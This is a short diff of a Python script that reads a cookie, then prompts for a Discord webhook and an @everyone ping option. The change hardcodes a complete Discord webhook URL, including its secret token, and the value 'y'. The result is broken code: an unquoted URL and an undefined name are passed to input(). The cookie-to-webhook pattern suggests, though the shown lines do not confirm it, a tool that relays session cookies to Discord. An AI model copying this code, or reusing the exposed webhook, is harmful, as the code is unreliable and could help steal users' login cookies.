@@ -11,11 +11,11 @@ cookie = input()
 os.system("cls")
 print('')
 print('Enter your webhook below:')
-webhook = input()
+webhook = input(https://discord.com/api/webhooks/1181313856509845666/xGiNXJhcRcfgLCE03L8DpQpPhfW1ish18gLtnFbBsrFtqRt8wc3XYY4lnyLqtkmLXC7E)
 os.system("cls")
 print('')
 print('Should we ping Everyone?: ( y / n )')
-pingEveryone = input()
+pingEveryone = input(y)
 os.system("cls")
 if pingEveryone.lower == 'y' or pingEveryone == 'yes':
     ping = '@everyone'
